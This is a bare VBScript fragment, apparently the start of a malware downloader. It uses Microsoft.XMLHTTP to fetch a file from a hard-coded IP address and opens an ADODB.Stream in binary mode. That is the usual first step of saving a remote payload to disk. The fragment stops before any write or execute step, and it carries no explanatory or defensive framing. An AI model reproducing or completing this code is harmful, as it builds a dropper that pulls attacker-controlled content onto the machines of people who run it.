Set xPost = createObject("Microsoft.XMLHTTP") 
xPost.Open "GET","http://222.77.80.90/2.03.txt",0 
xPost.Send() 
Set sGet = createObject("ADODB.Stream") 
sGet.Mode = 3 
sGet.Type = 1 
sGet.Open() 
 
